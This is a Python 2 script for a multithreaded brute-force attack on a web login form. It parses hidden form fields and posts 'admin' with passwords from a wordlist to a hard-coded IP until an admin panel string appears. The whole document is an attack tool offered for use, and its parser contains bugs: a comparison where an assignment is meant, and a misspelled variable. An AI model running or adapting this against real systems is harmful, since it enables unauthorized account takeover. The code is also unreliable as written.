import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

user_thread = 10
username = "admin"
wordlist_file = "D:\\BaiduNetdiskDownload\\信息安全\\wordlists\\fuzzDicts-master\\directoryDicts\\asp\\top30000.txt".decode('utf-8').encode('GB2312')
resume = None

target_url = "http://172.254.47.77:5000/"
target_post = "http://172.254.47.77:5000/"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
    def __init__(self,username,words):

        self.username = username
        self.password_q = words
        self.found = False

        print "Finished setting up for: %s" % username

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize())

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post,login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit ..."
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name == value
                if name == "value":
                    tag_value = value

                if tag_name is not None:
                    self.tag_results[tar_name] = value

def build_wordlist(wordlist_file):

    fd = open(wordlist_file,"rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume

        else:
            words.put(word)
    return words

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
